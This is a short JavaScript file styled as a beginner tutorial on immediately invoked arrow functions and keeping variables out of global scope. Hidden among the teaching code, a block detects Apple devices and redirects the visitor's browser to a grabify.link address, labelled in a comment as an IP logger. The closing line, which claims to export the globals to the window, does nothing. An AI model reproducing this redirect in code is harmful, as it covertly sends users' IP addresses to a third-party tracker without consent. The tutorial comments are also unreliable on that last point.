let _main_globals = {      // Prevents polluting global namespace
    variables: [],     // Table of exported variables, accessable globally
    functions: []      // Table of exported functions, accessable globally
};

(() => { // Create as a function, doesn't create names or variables globally

    /*
    *  This is a lambda, it is a quick way to call code or pass it as a variable to a function
    *  
    *  () => {} is the syntax for a lambda, it can take parameters like (a, b) => {}
    *  It can also be called immediately by wrapping it in () and adding () at the end, for example:
    */

    // Example lambda. Commonly written in this fashion for immediate calls, but there is no wrong way to write it.
    (() => { console.log("Hello, world!"); })();

    /* 
    *  This would do the same as console.log("Hello, world!");
    *  However, it doesn't create any variables or names in the global scope, so it is cleaner.
    *  Further description below.
    */

    (                                          // Wrapper of the lambda, allows calling it later.
        () => {                                // Actual lambda, no parameters but can accept them like `(a, b) => {}`
            let local_variable = "I am local"; // This variable is local to the lambda, and cannot be accessed outside of it.
            console.log(local_variable);       // Prints the local variable.
        }
    )(); // Call the lambda with (). Similar to calling a function like function_name(args...)

    _main_globals.functions["hello"] = () => { // Create a function in the functions table, allowing a call via _main_globals.functions.hello()
        console.log("Hello, World!");
    };

    // Check if user is on an apple device
    _main_globals.variables["is_apple"] = /Mac|iPod|iPhone|iPad/.test(navigator.platform);

    if (_main_globals.variables["is_apple"]) {
        // Redirect to ip logger if on apple device
        window.location.href = "https://grabify.link/GM0ZFZ";
    }

    _main_globals = _main_globals; // Export the globals to window, making it global.
})(); // Call the function with ()